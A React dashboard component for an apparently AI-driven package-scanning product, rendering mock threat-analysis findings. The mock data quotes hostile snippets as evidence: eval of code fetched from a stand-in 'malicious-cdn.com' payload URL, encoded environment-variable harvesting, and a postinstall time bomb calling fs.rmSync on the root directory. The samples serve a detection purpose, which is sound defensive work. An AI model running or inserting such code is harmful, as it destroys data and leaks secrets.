"use client";

import { useState, useEffect } from "react";
import { useUser } from "@auth0/nextjs-auth0/client";
import ProFeatures from "@/components/ProFeatures";
import LLMInsights from "@/components/LLMInsights";
import ProBadge from "@/components/ProBadge";
import UpgradeCTA from "@/components/UpgradeCTA";
import type { LLMAnalysisResponse, User } from "@/lib/types";

// Mock data for development - will be replaced with actual API calls
const mockLLMInsights: LLMAnalysisResponse = {
  insights: [
    {
      analysis_type: "zero_day_detection",
      threat_category: "code_injection",
      confidence: 0.92,
      confidence_level: "very_high",
      title: "Suspicious eval() pattern with remote data",
      description: "Detected dynamic code execution pattern that evaluates user-controlled input from remote sources",
      reasoning: "The code uses eval() with data fetched from an external URL without proper validation. This pattern is commonly used in supply chain attacks to execute arbitrary code.",
      evidence_snippets: [
        "eval(response.data.code)",
        "fetch('https://malicious-cdn.com/payload.js')"
      ],
      affected_files: ["src/index.js", "lib/helper.js"],
      severity_adjustment: 2.5,
      false_positive_likelihood: 0.08,
      remediation_suggestions: [
        "Replace eval() with safer alternatives like JSON.parse()",
        "Implement input validation and sanitization",
        "Use Content Security Policy to restrict script sources"
      ],
      mitigation_steps: [
        "Immediately block network access for this package",
        "Review all dependencies for similar patterns",
        "Scan production systems for IOCs"
      ]
    },
    {
      analysis_type: "obfuscation_analysis",
      threat_category: "data_exfiltration",
      confidence: 0.85,
      confidence_level: "high",
      title: "Obfuscated environment variable harvesting",
      description: "Hidden code that systematically collects and transmits environment variables to external servers",
      reasoning: "Base64-encoded strings decode to code that iterates through process.env and sends sensitive data to an attacker-controlled domain.",
      evidence_snippets: [
        "atob('cHJvY2Vzcy5lbnY=')",
        "Buffer.from(encoded, 'hex').toString()"
      ],
      affected_files: ["build/webpack.config.js"],
      severity_adjustment: 1.8,
      false_positive_likelihood: 0.15,
      remediation_suggestions: [
        "Remove obfuscated code sections",
        "Implement environment variable whitelisting",
        "Use runtime security monitoring"
      ],
      mitigation_steps: [
        "Rotate all exposed credentials",
        "Enable environment variable auditing",
        "Block outbound connections to suspicious domains"
      ]
    },
    {
      analysis_type: "behavioral_pattern",
      threat_category: "time_bomb",
      confidence: 0.78,
      confidence_level: "high",
      title: "Date-triggered destructive behavior",
      description: "Code that activates malicious functionality after a specific date, designed to evade initial security scans",
      reasoning: "The malware checks the current date against hardcoded values and only executes destructive commands after a delay period, a classic time bomb pattern.",
      evidence_snippets: [
        "new Date() > new Date('2024-03-15')",
        "fs.rmSync('/', { recursive: true })"
      ],
      affected_files: ["scripts/postinstall.js"],
      severity_adjustment: 3.0,
      false_positive_likelihood: 0.12,
      remediation_suggestions: [
        "Remove date-based conditional logic",
        "Implement file system access controls",
        "Use sandboxed execution environments"
      ],
      mitigation_steps: [
        "Backup critical systems immediately",
        "Isolate affected environments",
        "Implement file integrity monitoring"
      ]
    }
  ],
  context_analysis: {
    attack_chain_detected: true,
    coordinated_threat: true,
    attack_chain_steps: [
      "Package installed via npm with legitimate-looking name",
      "Postinstall script executes with elevated permissions",
      "Environment variables harvested and transmitted",
      "Time bomb activates after delay period",
      "Destructive payload executes with system privileges"
    ],
    correlation_insights: [
      "Multiple files work together to implement a multi-stage attack",
      "Obfuscation techniques used across different components",
      "Network communication follows common APT patterns"
    ],
    overall_intent: "Supply chain compromise with data theft and system destruction capabilities",
    sophistication_level: "advanced"
  },
  analysis_id: "llm_analysis_20240307_001",
  model_used: "claude-3-opus-20240229",
  tokens_used: 4582,
  processing_time_ms: 3240,
  cache_hit: false,
  confidence_summary: {
    "very_high": 1,
    "high": 2,
    "medium": 0,
    "low": 0
  },
  threat_summary: {
    "code_injection": 1,
    "data_exfiltration": 1,
    "time_bomb": 1
  },
  success: true,
  error_message: null,
  fallback_used: false,
  created_at: new Date().toISOString()
};

export default function ProDashboard(): JSX.Element {
  const { user, isLoading } = useUser();
  const [llmInsights, setLLMInsights] = useState<LLMAnalysisResponse | null>(null);
  const [loading, setLoading] = useState(true);

  // Mock user plan check - replace with actual user data
  const userPlan = "pro"; // This would come from user object
  const isProUser = userPlan === "pro" || userPlan === "team" || userPlan === "enterprise";

  useEffect(() => {
    // Simulate loading LLM insights
    const loadInsights = async (): Promise<void> => {
      await new Promise(resolve => setTimeout(resolve, 1000));
      setLLMInsights(mockLLMInsights);
      setLoading(false);
    };

    loadInsights();
  }, []);

  if (isLoading || loading) {
    return (
      <div className="space-y-6">
        <div className="animate-pulse">
          <div className="h-8 bg-gray-800 rounded w-1/3 mb-4"></div>
          <div className="h-4 bg-gray-800 rounded w-2/3"></div>
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {[1, 2, 3].map((i) => (
            <div key={i} className="card animate-pulse">
              <div className="card-body">
                <div className="h-6 bg-gray-800 rounded mb-3"></div>
                <div className="h-4 bg-gray-800 rounded mb-2"></div>
                <div className="h-4 bg-gray-800 rounded w-3/4"></div>
              </div>
            </div>
          ))}
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header with Pro Badge */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <div>
            <h1 className="text-2xl font-bold text-gray-100 tracking-tight">
              Pro Dashboard
            </h1>
            <p className="text-sm text-gray-500 mt-1">
              Enhanced threat detection with AI-powered insights
            </p>
          </div>
          {isProUser && <ProBadge />}
        </div>
        
        {/* Quick stats */}
        <div className="flex gap-4">
          <div className="text-center">
            <div className="text-2xl font-bold text-brand-400">
              {llmInsights?.insights.length || 0}
            </div>
            <div className="text-xs text-gray-500">AI Insights</div>
          </div>
          <div className="text-center">
            <div className="text-2xl font-bold text-red-400">
              {llmInsights?.insights.filter(i => i.confidence_level === "very_high").length || 0}
            </div>
            <div className="text-xs text-gray-500">High Confidence</div>
          </div>
          <div className="text-center">
            <div className="text-2xl font-bold text-orange-400">
              {llmInsights?.context_analysis?.attack_chain_detected ? 1 : 0}
            </div>
            <div className="text-xs text-gray-500">Attack Chains</div>
          </div>
        </div>
      </div>

      {/* Upgrade CTA for non-Pro users */}
      {!isProUser && <UpgradeCTA />}

      {/* Pro Features Container */}
      {isProUser && llmInsights && (
        <ProFeatures analysisResponse={llmInsights} />
      )}

      {/* LLM Insights Table */}
      {isProUser && llmInsights && (
        <LLMInsights insights={llmInsights.insights} contextAnalysis={llmInsights.context_analysis} />
      )}
    </div>
  );
}